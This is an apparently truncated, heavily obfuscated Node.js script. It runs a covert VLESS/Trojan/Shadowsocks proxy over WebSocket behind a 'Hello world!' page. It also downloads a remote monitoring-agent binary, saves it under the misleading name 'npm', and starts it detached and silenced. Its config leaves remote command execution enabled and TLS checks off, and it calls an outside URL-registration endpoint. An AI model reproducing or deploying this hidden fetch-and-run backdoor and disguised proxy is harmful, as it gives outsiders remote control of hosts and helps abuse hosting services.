#!/usr/bin/env node

const _0xa56b0c=_0x4dbf;(function(_0x198e00,_0x11e8db){const _0x475f65={_0x25fa7b:0x280,_0x4465f8:0x264,_0x29585c:0x281},_0x2dadba=_0x4dbf,_0x2a617b=_0x198e00();while(!![]){try{const _0x8ea926=parseInt(_0x2dadba(_0x475f65._0x25fa7b))/0x1+-parseInt(_0x2dadba(0x231))/0x2*(parseInt(_0x2dadba(0x21f))/0x3)+-parseInt(_0x2dadba(0x27d))/0x4+-parseInt(_0x2dadba(_0x475f65._0x4465f8))/0x5*(-parseInt(_0x2dadba(0x276))/0x6)+-parseInt(_0x2dadba(_0x475f65._0x29585c))/0x7+-parseInt(_0x2dadba(0x258))/0x8*(-parseInt(_0x2dadba(0x238))/0x9)+-parseInt(_0x2dadba(0x254))/0xa*(-parseInt(_0x2dadba(0x220))/0xb);if(_0x8ea926===_0x11e8db)break;else _0x2a617b['push'](_0x2a617b['shift']());}catch(_0x26d243){_0x2a617b['push'](_0x2a617b['shift']());}}}(_0x3444,0x9d3de));const os=require('os'),http=require(_0xa56b0c(0x263)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require(_0xa56b0c(0x1f0)),{Buffer}=require(_0xa56b0c(0x270)),{exec,execSync}=require(_0xa56b0c(0x255)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xa56b0c(0x225)][_0xa56b0c(0x27a)]||_0xa56b0c(0x1ef),NEZHA_SERVER=process[_0xa56b0c(0x225)][_0xa56b0c(0x246)]||'',NEZHA_PORT=process[_0xa56b0c(0x225)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0xa56b0c(0x225)]['NEZHA_KEY']||'',DOMAIN=process['env'][_0xa56b0c(0x1fc)]||_0xa56b0c(0x251),AUTO_ACCESS=process[_0xa56b0c(0x225)]['AUTO_ACCESS']||![],WSPATH=process[_0xa56b0c(0x225)][_0xa56b0c(0x271)]||UUID[_0xa56b0c(0x1eb)](0x0,0x8),SUB_PATH=process['env'][_0xa56b0c(0x285)]||_0xa56b0c(0x23b),NAME=process[_0xa56b0c(0x225)]['NAME']||'',PORT=process[_0xa56b0c(0x225)][_0xa56b0c(0x250)]||0xbb8;let uuid=UUID[_0xa56b0c(0x219)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0xa56b0c(0x248),CurrentPort=0x1bb,ISP='';const DNS_SERVERS=[_0xa56b0c(0x20f),_0xa56b0c(0x240)],BLOCKED_DOMAINS=[_0xa56b0c(0x1fb),_0xa56b0c(0x1ed),'speedtest.cn',_0xa56b0c(0x25a),_0xa56b0c(0x216),'testmy.net',_0xa56b0c(0x207),_0xa56b0c(0x273),_0xa56b0c(0x269),'speedcheck.org'];function isBlockedDomain(_0x52e8a7){const _0x11be2c={_0x19e5fd:0x266},_0x339b3b=_0xa56b0c;if(!_0x52e8a7)return![];const _0x31b56c=_0x52e8a7[_0x339b3b(_0x11be2c._0x19e5fd)]();return BLOCKED_DOMAINS[_0x339b3b(0x232)](_0x1ca248=>{const _0x2e1d53=_0x339b3b;return _0x31b56c===_0x1ca248||_0x31b56c[_0x2e1d53(0x23a)]('.'+_0x1ca248);});}async function getisp(){const _0x5693f4={_0x2c5463:0x24c,_0x58a1de:0x20e,_0x48e659:0x24f,_0x28af41:0x25e},_0x8499e9=_0xa56b0c;try{const _0x56fc91=await axios[_0x8499e9(_0x5693f4._0x2c5463)](_0x8499e9(_0x5693f4._0x58a1de),{'headers':{'User-Agent':_0x8499e9(_0x5693f4._0x48e659),'timeout':0xbb8}}),_0x6214a3=_0x56fc91[_0x8499e9(0x201)];ISP=(_0x6214a3[_0x8499e9(0x24d)]+'-'+_0x6214a3[_0x8499e9(0x241)])[_0x8499e9(0x219)](/ /g,'_');}catch(_0x157e85){try{const _0x1564a6=await axios[_0x8499e9(0x24c)](_0x8499e9(0x221),{'headers':{'User-Agent':_0x8499e9(_0x5693f4._0x48e659),'timeout':0xbb8}}),_0x19ce6a=_0x1564a6[_0x8499e9(0x201)];ISP=(_0x19ce6a[_0x8499e9(_0x5693f4._0x28af41)]+'-'+_0x19ce6a[_0x8499e9(0x202)])[_0x8499e9(0x219)](/ /g,'_');}catch(_0x1b39dd){ISP=_0x8499e9(0x230);}}}function _0x4dbf(_0x10c439,_0x13338c){const _0x3444d8=_0x3444();return _0x4dbf=function(_0x4dbf60,_0x1ca8b5){_0x4dbf60=_0x4dbf60-0x1eb;let _0x21d763=_0x3444d8[_0x4dbf60];return _0x21d763;},_0x4dbf(_0x10c439,_0x13338c);}async function getip(){const _0x3fc272={_0x585b50:0x251,_0x1f29b7:0x201,_0x4ec7a1:0x1ec,_0xc1536b:0x23f,_0x731535:0x248},_0x1bf87c=_0xa56b0c;if(!DOMAIN||DOMAIN===_0x1bf87c(_0x3fc272._0x585b50))try{const _0x5a6af0=await axios['get']('https://api-ipv4.ip.sb/ip',{'timeout':0x1388}),_0x4abcb0=_0x5a6af0[_0x1bf87c(_0x3fc272._0x1f29b7)][_0x1bf87c(_0x3fc272._0x4ec7a1)]();CurrentDomain=_0x4abcb0,Tls='none',CurrentPort=PORT;}catch(_0x4497d6){console['error'](_0x1bf87c(0x1fa),_0x4497d6[_0x1bf87c(0x26d)]),(CurrentDomain=_0x1bf87c(_0x3fc272._0xc1536b),Tls=_0x1bf87c(_0x3fc272._0x731535),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x1bf87c(0x248),CurrentPort=0x1bb;}const httpServer=http[_0xa56b0c(0x21b)](async(_0x224d2e,_0x10d0f3)=>{const _0x29e892={_0x3a731e:0x21e,_0x78aee2:0x213,_0x3d0f9d:0x248,_0x287953:0x272,_0x25ca1a:0x286,_0x291ad3:0x22a,_0x3ecf0a:0x222,_0xe389be:0x260,_0x4adcfd:0x20c,_0x1b3302:0x259,_0x283da2:0x1f4,_0x5c798a:0x1f7,_0x1fdef3:0x259,_0x205a9e:0x252},_0xa94423=_0xa56b0c;if(_0x224d2e[_0xa94423(_0x29e892._0x3a731e)]==='/'){const _0x1902bd=path['join'](__dirname,_0xa94423(_0x29e892._0x78aee2));fs[_0xa94423(0x284)](_0x1902bd,'utf8',(_0x5c8379,_0x3d3ef2)=>{const _0x4ea342=_0xa94423;if(_0x5c8379){_0x10d0f3[_0x4ea342(0x205)](0xc8,{'Content-Type':_0x4ea342(0x209)}),_0x10d0f3['end'](_0x4ea342(0x1f2));return;}_0x10d0f3[_0x4ea342(0x205)](0xc8,{'Content-Type':'text/html'}),_0x10d0f3[_0x4ea342(0x252)](_0x3d3ef2);});return;}else{if(_0x224d2e[_0xa94423(_0x29e892._0x3a731e)]==='/'+SUB_PATH){await getisp(),await getip();const _0x3d5595=NAME?NAME+'-'+ISP:ISP,_0xab5220=Tls===_0xa94423(_0x29e892._0x3d0f9d)?_0xa94423(0x248):_0xa94423(0x212),_0x5778ca=Tls==='tls'?_0xa94423(_0x29e892._0x287953):'',_0x5042f5=_0xa94423(_0x29e892._0x25ca1a)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0xa94423(_0x29e892._0x291ad3)+_0xab5220+_0xa94423(_0x29e892._0x3ecf0a)+CurrentDomain+_0xa94423(_0x29e892._0xe389be)+CurrentDomain+'&path=%2F'+WSPATH+'#'+_0x3d5595,_0x24f6bd=_0xa94423(_0x29e892._0x4adcfd)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0xa94423(0x1f5)+_0xab5220+_0xa94423(0x222)+CurrentDomain+_0xa94423(_0x29e892._0xe389be)+CurrentDomain+_0xa94423(0x22b)+WSPATH+'#'+_0x3d5595,_0x33e516=Buffer['from']('none:'+UUID)[_0xa94423(_0x29e892._0x1b3302)](_0xa94423(_0x29e892._0x283da2)),_0x4a9ea8=_0xa94423(0x214)+_0x33e516+'@'+CurrentDomain+':'+CurrentPort+_0xa94423(_0x29e892._0x5c798a)+CurrentDomain+';path%3D%2F'+WSPATH+';'+_0x5778ca+_0xa94423(0x1f9)+CurrentDomain+_0xa94423(0x204)+_0x3d5595,_0x4a2dc5=_0x5042f5+'\x0a'+_0x24f6bd+'\x0a'+_0x4a9ea8,_0x49d303=Buffer[_0xa94423(0x22d)](_0x4a2dc5)[_0xa94423(_0x29e892._0x1fdef3)](_0xa94423(_0x29e892._0x283da2));_0x10d0f3['writeHead'](0xc8,{'Content-Type':_0xa94423(0x1f3)}),_0x10d0f3[_0xa94423(_0x29e892._0x205a9e)](_0x49d303+'\x0a');}else _0x10d0f3['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x10d0f3['end'](_0xa94423(0x26f));}});function resolveHost(_0x581418){const _0x9a8946={_0x4c827d:0x274};return new Promise((_0x3fada1,_0x4a261f)=>{const _0x18d942={_0xa5ca55:0x1ff,_0x2163ee:0x224},_0x1858d6={_0x2b1de0:0x201,_0x5a3a4d:0x245,_0x21034a:0x210,_0x5303b3:0x27c},_0x32ae35=_0x4dbf;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x32ae35(_0x9a8946._0x4c827d)](_0x581418)){_0x3fada1(_0x581418);return;}let _0x5f2fc6=0x0;function _0x408876(){const _0x89b5c3=_0x32ae35;if(_0x5f2fc6>=DNS_SERVERS[_0x89b5c3(0x253)]){_0x4a261f(new Error(_0x89b5c3(0x215)+_0x581418+_0x89b5c3(0x23c)));return;}const _0x1d04fc=DNS_SERVERS[_0x5f2fc6];_0x5f2fc6++;const _0x31c83e=_0x89b5c3(0x278)+encodeURIComponent(_0x581418)+_0x89b5c3(0x279);axios[_0x89b5c3(0x24c)](_0x31c83e,{'timeout':0x1388,'headers':{'Accept':_0x89b5c3(0x287)}})[_0x89b5c3(_0x18d942._0xa5ca55)](_0x517577=>{const _0xcc4312=_0x89b5c3,_0x13cf5f=_0x517577[_0xcc4312(_0x1858d6._0x2b1de0)];if(_0x13cf5f[_0xcc4312(_0x1858d6._0x5a3a4d)]===0x0&&_0x13cf5f['Answer']&&_0x13cf5f[_0xcc4312(_0x1858d6._0x21034a)][_0xcc4312(0x253)]>0x0){const _0x126230=_0x13cf5f[_0xcc4312(0x210)][_0xcc4312(_0x1858d6._0x5303b3)](_0x310341=>_0x310341[_0xcc4312(0x26b)]===0x1);if(_0x126230){_0x3fada1(_0x126230['data']);return;}}_0x408876();})[_0x89b5c3(_0x18d942._0x2163ee)](_0x505c69=>{_0x408876();});}_0x408876();});}function handleVlsConnection(_0x2cbc7f,_0x2849cf){const _0x44c09b={_0x2e3be6:0x267,_0x37f7d2:0x1eb,_0x39e156:0x249,_0x227cf4:0x25d,_0x5d76b5:0x262,_0x509ec1:0x265},_0xa2257d={_0x14cd2e:0x1eb,_0x130e13:0x277,_0x107a26:0x1f8},_0x4334e1={_0x5b3770:0x277},_0x235678={_0x4b13d1:0x1eb,_0x1cc694:0x277,_0xfc36f9:0x1f8},_0xebd194=_0xa56b0c,[_0x479c84]=_0x2849cf,_0x39e535=_0x2849cf[_0xebd194(0x1eb)](0x1,0x11);if(!_0x39e535[_0xebd194(0x247)]((_0x52776d,_0x3cd54a)=>_0x52776d==parseInt(uuid['substr'](_0x3cd54a*0x2,0x2),0x10)))return![];let _0xa47e33=_0x2849cf[_0xebd194(0x1eb)](0x11,0x12)['readUInt8']()+0x13;const _0x2271f0=_0x2849cf[_0xebd194(0x1eb)](_0xa47e33,_0xa47e33+=0x2)[_0xebd194(_0x44c09b._0x2e3be6)](0x0),_0x57e983=_0x2849cf['slice'](_0xa47e33,_0xa47e33+=0x1)['readUInt8'](),_0x31e74b=_0x57e983==0x1?_0x2849cf[_0xebd194(_0x44c09b._0x37f7d2)](_0xa47e33,_0xa47e33+=0x4)[_0xebd194(_0x44c09b._0x39e156)]('.'):_0x57e983==0x2?new TextDecoder()[_0xebd194(0x268)](_0x2849cf['slice'](_0xa47e33+0x1,_0xa47e33+=0x1+_0x2849cf['slice'](_0xa47e33,_0xa47e33+0x1)[_0xebd194(_0x44c09b._0x227cf4)]())):_0x57e983==0x3?_0x2849cf[_0xebd194(0x1eb)](_0xa47e33,_0xa47e33+=0x10)[_0xebd194(0x27b)]((_0x1d2788,_0x2ce2ac,_0x16e972,_0x13bfa3)=>_0x16e972%0x2?_0x1d2788[_0xebd194(0x22f)](_0x13bfa3[_0xebd194(0x1eb)](_0x16e972-0x1,_0x16e972+0x1)):_0x1d2788,[])[_0xebd194(_0x44c09b._0x5d76b5)](_0x4fa21c=>_0x4fa21c[_0xebd194(0x267)](0x0)[_0xebd194(0x259)](0x10))['join'](':'):'';if(isBlockedDomain(_0x31e74b))return _0x2cbc7f[_0xebd194(_0x44c09b._0x509ec1)](),![];_0x2cbc7f[_0xebd194(0x200)](new Uint8Array([_0x479c84,0x0]));const _0x2773c3=createWebSocketStream(_0x2cbc7f);return resolveHost(_0x31e74b)['then'](_0x246800=>{const _0x144f10=_0xebd194;net[_0x144f10(0x208)]({'host':_0x246800,'port':_0x2271f0},function(){const _0x2432d2=_0x144f10;this['write'](_0x2849cf[_0x2432d2(_0x235678._0x4b13d1)](_0xa47e33)),_0x2773c3['on'](_0x2432d2(_0x235678._0x1cc694),()=>{})[_0x2432d2(_0x235678._0xfc36f9)](this)['on'](_0x2432d2(0x277),()=>{})[_0x2432d2(_0x235678._0xfc36f9)](_0x2773c3);})['on'](_0x144f10(_0x4334e1._0x5b3770),()=>{});})[_0xebd194(0x224)](_0x4749c0=>{net['connect']({'host':_0x31e74b,'port':_0x2271f0},function(){const _0x53af91=_0x4dbf;this['write'](_0x2849cf[_0x53af91(_0xa2257d._0x14cd2e)](_0xa47e33)),_0x2773c3['on'](_0x53af91(_0xa2257d._0x130e13),()=>{})[_0x53af91(_0xa2257d._0x107a26)](this)['on']('error',()=>{})[_0x53af91(0x1f8)](_0x2773c3);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x540808,_0x150ae9){const _0x1eef3e={_0x1f61a6:0x1eb,_0x4d81e1:0x259,_0x575673:0x1eb,_0x1e67ac:0x249,_0x1c1a44:0x267,_0x3cc3ec:0x253,_0x71ae0b:0x224},_0x5dc7a2={_0x2b4e1c:0x1eb,_0x27694d:0x277,_0x3d1341:0x1f8},_0x2473ac={_0x2770f8:0x277},_0x1dccd2=_0xa56b0c;try{if(_0x150ae9['length']<0x3a)return![];const _0x24580=_0x150ae9[_0x1dccd2(_0x1eef3e._0x1f61a6)](0x0,0x38)[_0x1dccd2(0x259)](),_0x5b0cac=[UUID];let _0x4cfda2=null;for(const _0x37504e of _0x5b0cac){const _0x265751=crypto[_0x1dccd2(0x21a)]('sha224')[_0x1dccd2(0x25b)](_0x37504e)[_0x1dccd2(0x1fd)](_0x1dccd2(0x242));if(_0x265751===_0x24580){_0x4cfda2=_0x37504e;break;}}if(!_0x4cfda2)return![];let _0x24c845=0x38;_0x150ae9[_0x24c845]===0xd&&_0x150ae9[_0x24c845+0x1]===0xa&&(_0x24c845+=0x2);const _0x33b0d2=_0x150ae9[_0x24c845];if(_0x33b0d2!==0x1)return![];_0x24c845+=0x1;const _0x4d7adb=_0x150ae9[_0x24c845];_0x24c845+=0x1;let _0x4dc39a,_0x2b7023;if(_0x4d7adb===0x1)_0x4dc39a=_0x150ae9['slice'](_0x24c845,_0x24c845+0x4)[_0x1dccd2(0x249)]('.'),_0x24c845+=0x4;else{if(_0x4d7adb===0x3){const _0x46b118=_0x150ae9[_0x24c845];_0x24c845+=0x1,_0x4dc39a=_0x150ae9['slice'](_0x24c845,_0x24c845+_0x46b118)[_0x1dccd2(_0x1eef3e._0x4d81e1)](),_0x24c845+=_0x46b118;}else{if(_0x4d7adb===0x4)_0x4dc39a=_0x150ae9[_0x1dccd2(_0x1eef3e._0x575673)](_0x24c845,_0x24c845+0x10)[_0x1dccd2(0x27b)]((_0x502028,_0x1ccc7d,_0x5dd471,_0x271e5c)=>_0x5dd471%0x2?_0x502028[_0x1dccd2(0x22f)](_0x271e5c['slice'](_0x5dd471-0x1,_0x5dd471+0x1)):_0x502028,[])['map'](_0x40fe07=>_0x40fe07[_0x1dccd2(0x267)](0x0)[_0x1dccd2(0x259)](0x10))[_0x1dccd2(_0x1eef3e._0x1e67ac)](':'),_0x24c845+=0x10;else return![];}}_0x2b7023=_0x150ae9[_0x1dccd2(_0x1eef3e._0x1c1a44)](_0x24c845),_0x24c845+=0x2;_0x24c845<_0x150ae9[_0x1dccd2(_0x1eef3e._0x3cc3ec)]&&_0x150ae9[_0x24c845]===0xd&&_0x150ae9[_0x24c845+0x1]===0xa&&(_0x24c845+=0x2);if(isBlockedDomain(_0x4dc39a))return _0x540808[_0x1dccd2(0x265)](),![];const _0x4f11d1=createWebSocketStream(_0x540808);return resolveHost(_0x4dc39a)['then'](_0x3fe868=>{const _0x4d94f5=_0x1dccd2;net[_0x4d94f5(0x208)]({'host':_0x3fe868,'port':_0x2b7023},function(){const _0x42f592=_0x4d94f5;_0x24c845<_0x150ae9['length']&&this[_0x42f592(0x223)](_0x150ae9[_0x42f592(0x1eb)](_0x24c845)),_0x4f11d1['on'](_0x42f592(_0x2473ac._0x2770f8),()=>{})['pipe'](this)['on'](_0x42f592(_0x2473ac._0x2770f8),()=>{})['pipe'](_0x4f11d1);})['on'](_0x4d94f5(0x277),()=>{});})[_0x1dccd2(_0x1eef3e._0x71ae0b)](_0x30116b=>{const _0x175ff4=_0x1dccd2;net['connect']({'host':_0x4dc39a,'port':_0x2b7023},function(){const _0x34743f=_0x4dbf;_0x24c845<_0x150ae9[_0x34743f(0x253)]&&this[_0x34743f(0x223)](_0x150ae9[_0x34743f(_0x5dc7a2._0x2b4e1c)](_0x24c845)),_0x4f11d1['on'](_0x34743f(0x277),()=>{})[_0x34743f(0x1f8)](this)['on'](_0x34743f(_0x5dc7a2._0x27694d),()=>{})[_0x34743f(_0x5dc7a2._0x3d1341)](_0x4f11d1);})['on'](_0x175ff4(0x277),()=>{});}),!![];}catch(_0x3cad9a){return![];}}function handleSsConnection(_0xf6df77,_0x26dab0){const _0x488574={_0x48c740:0x259,_0x52be06:0x1eb,_0x5cec44:0x1ff},_0x2c643b={_0x5a4b46:0x277},_0x55f7e6={_0x388f09:0x208},_0x44d21a={_0x1cccad:0x277,_0x1a7f9e:0x1f8},_0x59138e=_0xa56b0c;try{let _0x518f87=0x0;const _0x234f8a=_0x26dab0[_0x518f87];_0x518f87+=0x1;let _0x99935c,_0xe9051e;if(_0x234f8a===0x1)_0x99935c=_0x26dab0['slice'](_0x518f87,_0x518f87+0x4)['join']('.'),_0x518f87+=0x4;else{if(_0x234f8a===0x3){const _0x73f0ff=_0x26dab0[_0x518f87];_0x518f87+=0x1,_0x99935c=_0x26dab0[_0x59138e(0x1eb)](_0x518f87,_0x518f87+_0x73f0ff)[_0x59138e(_0x488574._0x48c740)](),_0x518f87+=_0x73f0ff;}else{if(_0x234f8a===0x4)_0x99935c=_0x26dab0[_0x59138e(_0x488574._0x52be06)](_0x518f87,_0x518f87+0x10)[_0x59138e(0x27b)]((_0x3fb755,_0x25b805,_0x17666e,_0x1517c0)=>_0x17666e%0x2?_0x3fb755[_0x59138e(0x22f)](_0x1517c0[_0x59138e(0x1eb)](_0x17666e-0x1,_0x17666e+0x1)):_0x3fb755,[])[_0x59138e(0x262)](_0x1d16c6=>_0x1d16c6[_0x59138e(0x267)](0x0)['toString'](0x10))[_0x59138e(0x249)](':'),_0x518f87+=0x10;else return![];}}_0xe9051e=_0x26dab0['readUInt16BE'](_0x518f87),_0x518f87+=0x2;if(isBlockedDomain(_0x99935c))return _0xf6df77[_0x59138e(0x265)](),![];const _0x5e5563=createWebSocketStream(_0xf6df77);return resolveHost(_0x99935c)[_0x59138e(_0x488574._0x5cec44)](_0x15394c=>{const _0x2f6307=_0x59138e;net[_0x2f6307(_0x55f7e6._0x388f09)]({'host':_0x15394c,'port':_0xe9051e},function(){const _0x445355=_0x2f6307;_0x518f87<_0x26dab0[_0x445355(0x253)]&&this[_0x445355(0x223)](_0x26dab0['slice'](_0x518f87)),_0x5e5563['on'](_0x445355(_0x44d21a._0x1cccad),()=>{})[_0x445355(0x1f8)](this)['on']('error',()=>{})[_0x445355(_0x44d21a._0x1a7f9e)](_0x5e5563);})['on']('error',()=>{});})['catch'](_0x2b2ca4=>{const _0x4f31d8={_0x50cb52:0x1eb,_0x5b79db:0x1f8,_0x35ab12:0x277},_0x5e7c1a=_0x59138e;net[_0x5e7c1a(0x208)]({'host':_0x99935c,'port':_0xe9051e},function(){const _0x416d58=_0x5e7c1a;_0x518f87<_0x26dab0['length']&&this[_0x416d58(0x223)](_0x26dab0[_0x416d58(_0x4f31d8._0x50cb52)](_0x518f87)),_0x5e5563['on']('error',()=>{})[_0x416d58(_0x4f31d8._0x5b79db)](this)['on'](_0x416d58(_0x4f31d8._0x35ab12),()=>{})[_0x416d58(0x1f8)](_0x5e5563);})['on'](_0x5e7c1a(_0x2c643b._0x5a4b46),()=>{});}),!![];}catch(_0x1b7114){return![];}}const wss=new WebSocket['Server']({'server':httpServer});function _0x3444(){const _0x250d82=['ab5fdca6-0f61-4f5f-834b-1f1ffdcba14c','crypto','npm','Hello\x20world!','text/plain','base64','?security=','pop','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','pipe','sni%3D','Failed\x20to\x20get\x20IP','speedtest.net','DOMAIN','digest','npm\x20running\x20error:','then','send','data','org','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20',';skip-cert-verify%3Dtrue;mux%3D0#','writeHead','2087','bandwidth.place','connect','text/html','error:\x20','setsid\x20nohup\x20./npm\x20-s\x20','trojan://','arm64','https://api.ip.sb/geoip','8.8.4.4','Answer','once','none','index.html','ss://','Failed\x20to\x20resolve\x20','speedof.me','chmod\x20+x\x20npm','false','replace','createHash','createServer','Automatic\x20Access\x20Task\x20added\x20successfully','utf-8','url','1216752MVmHHz','11YAOSMo','http://ip-api.com/json','&sni=','write','catch','env','listen','log','finish','arch','?encryption=none&security=','&path=%2F','true','from','https://arm64.ssss.nyc.mn/agent','concat','Unknown','2TvQCwo','some','https://arm64.ssss.nyc.mn/v1','npm\x20download\x20successfully','split','\x20-p\x20','application/json','63crUtfH','2096','endsWith','piye010101','\x20with\x20all\x20DNS\x20servers','post','includes','cahnge-your-domain.com','1.1.1.1','isp','hex','https://amd64.ssss.nyc.mn/agent','createWriteStream','Status','NEZHA_SERVER','every','tls','join','https://amd64.ssss.nyc.mn/v1','npm\x20is\x20already\x20running,\x20skip\x20running...','get','country_code','startsWith','Mozilla/5.0','PORT','your-domain.com','end','length','4659470GqvWlr','child_process','2053','https://oooo.serv00.net/add-url','146896tYDIXh','toString','speed.cloudflare.com','update','connection','readUInt8','countryCode','npm\x20is\x20running','&fp=chrome&type=ws&host=','config.yaml','map','http','88130tPRrXY','close','toLowerCase','readUInt16BE','decode','librespeed.org','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','type','--tls','message','https://','Not\x20Found\x0a','buffer','WSPATH','tls;','speed.io','test','443','426Triesx','error','https://dns.google/resolve?name=','&type=A','UUID','reduce','find','5026032zzhCTh','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','829732KBMHkV','2586535MfmngC','8443','/bin/bash','readFile','SUB_PATH','vless://','application/dns-json','unlink','writeFileSync','stream','slice','trim','fast.com','client_secret:\x20'];_0x3444=function(){return _0x250d82;};return _0x3444();}wss['on'](_0xa56b0c(0x25c),(_0x582665,_0x366316)=>{const _0x5346af={_0x34d246:0x21e,_0x32a2b3:0x24e,_0x35544b:0x211},_0x2ff07e={_0x368632:0x1eb,_0x39504b:0x265},_0x1b5fb9=_0xa56b0c,_0x226959=_0x366316[_0x1b5fb9(_0x5346af._0x34d246)]||'',_0x2dc0c0='/'+WSPATH;if(!_0x226959[_0x1b5fb9(_0x5346af._0x32a2b3)](_0x2dc0c0)){_0x582665[_0x1b5fb9(0x265)]();return;}_0x582665[_0x1b5fb9(_0x5346af._0x35544b)]('message',_0x1204a2=>{const _0x41c2e7=_0x1b5fb9;if(_0x1204a2[_0x41c2e7(0x253)]>0x11&&_0x1204a2[0x0]===0x0){const _0x5534f3=_0x1204a2[_0x41c2e7(_0x2ff07e._0x368632)](0x1,0x11),_0x339c1a=_0x5534f3['every']((_0x32be11,_0x51781)=>_0x32be11==parseInt(uuid['substr'](_0x51781*0x2,0x2),0x10));if(_0x339c1a){!handleVlsConnection(_0x582665,_0x1204a2)&&_0x582665[_0x41c2e7(_0x2ff07e._0x39504b)]();return;}}if(_0x1204a2[_0x41c2e7(0x253)]>=0x3a){if(handleTrojConnection(_0x582665,_0x1204a2))return;}if(_0x1204a2[_0x41c2e7(0x253)]>0x0&&(_0x1204a2[0x0]===0x1||_0x1204a2[0x0]===0x3||_0x1204a2[0x0]===0x4)){if(handleSsConnection(_0x582665,_0x1204a2))return;}_0x582665['close']();})['on'](_0x1b5fb9(0x277),()=>{});});const getDownloadUrl=()=>{const _0x4e3aa3={_0x391e7c:0x233,_0x3313bb:0x22e,_0x2d2ae8:0x243},_0x37aff6=_0xa56b0c,_0x1750ed=os[_0x37aff6(0x229)]();return _0x1750ed==='arm'||_0x1750ed===_0x37aff6(0x20d)||_0x1750ed==='aarch64'?!NEZHA_PORT?_0x37aff6(_0x4e3aa3._0x391e7c):_0x37aff6(_0x4e3aa3._0x3313bb):!NEZHA_PORT?_0x37aff6(0x24a):_0x37aff6(_0x4e3aa3._0x2d2ae8);},downloadFile=async()=>{const _0x3bdfd0={_0x5519aa:0x28a,_0x1333b7:0x201,_0x28efd3:0x1f8},_0x59bdb4={_0x4b6241:0x227,_0x3a2d38:0x234},_0x626234=_0xa56b0c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2498dc=getDownloadUrl(),_0x434aab=await axios({'method':_0x626234(0x24c),'url':_0x2498dc,'responseType':_0x626234(_0x3bdfd0._0x5519aa)}),_0x25c4ea=fs[_0x626234(0x244)](_0x626234(0x1f1));return _0x434aab[_0x626234(_0x3bdfd0._0x1333b7)][_0x626234(_0x3bdfd0._0x28efd3)](_0x25c4ea),new Promise((_0x52a0fe,_0x5bf902)=>{const _0x311276=_0x626234;_0x25c4ea['on'](_0x311276(0x228),()=>{const _0x1ced0d=_0x311276;console[_0x1ced0d(_0x59bdb4._0x4b6241)](_0x1ced0d(_0x59bdb4._0x3a2d38)),exec(_0x1ced0d(0x217),_0x41ad6c=>{if(_0x41ad6c)_0x5bf902(_0x41ad6c);_0x52a0fe();});}),_0x25c4ea['on'](_0x311276(0x277),_0x5bf902);});}catch(_0x3a1ea0){throw _0x3a1ea0;}},runnz=async()=>{const _0x5a7370={_0x485f6a:0x24b,_0x587d6e:0x275,_0x528d8e:0x282,_0x295f37:0x239,_0x3d90c7:0x256,_0x980cc4:0x236,_0x79c153:0x27e,_0x47be59:0x22c,_0x519d69:0x218,_0x4147bb:0x27f,_0x477258:0x26a,_0x50eeef:0x203,_0x10680e:0x289,_0x4b7f52:0x283,_0x33f50f:0x20a},_0x3578ee={_0x268bda:0x1fe,_0x512bda:0x227,_0x3e74df:0x25f},_0x88ccb=_0xa56b0c;try{const _0x3775e4=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x88ccb(0x21d)});if(_0x3775e4[_0x88ccb(0x1ec)]()!==''){console[_0x88ccb(0x227)](_0x88ccb(_0x5a7370._0x485f6a));return;}}catch(_0x4bf82e){}await downloadFile();let _0x100f84='',_0x46744c=[_0x88ccb(_0x5a7370._0x587d6e),_0x88ccb(_0x5a7370._0x528d8e),_0x88ccb(_0x5a7370._0x295f37),_0x88ccb(0x206),'2083',_0x88ccb(_0x5a7370._0x3d90c7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1fa0d6=_0x46744c[_0x88ccb(0x23e)](NEZHA_PORT)?_0x88ccb(0x26c):'';_0x100f84=_0x88ccb(0x20b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x88ccb(_0x5a7370._0x980cc4)+NEZHA_KEY+'\x20'+_0x1fa0d6+_0x88ccb(_0x5a7370._0x79c153);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2b5553=NEZHA_SERVER[_0x88ccb(0x23e)](':')?NEZHA_SERVER[_0x88ccb(0x235)](':')[_0x88ccb(0x1f6)]():'',_0x572788=_0x46744c[_0x88ccb(0x23e)](_0x2b5553)?_0x88ccb(_0x5a7370._0x47be59):_0x88ccb(_0x5a7370._0x519d69),_0x19d8cb=_0x88ccb(0x1ee)+NEZHA_KEY+_0x88ccb(_0x5a7370._0x4147bb)+NEZHA_SERVER+_0x88ccb(_0x5a7370._0x477258)+_0x572788+_0x88ccb(_0x5a7370._0x50eeef)+UUID;fs[_0x88ccb(_0x5a7370._0x10680e)](_0x88ccb(0x261),_0x19d8cb);}_0x100f84='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else return;}try{exec(_0x100f84,{'shell':_0x88ccb(_0x5a7370._0x4b7f52)},_0x17f61a=>{const _0x568b64=_0x88ccb;if(_0x17f61a)console[_0x568b64(0x277)](_0x568b64(_0x3578ee._0x268bda),_0x17f61a);else 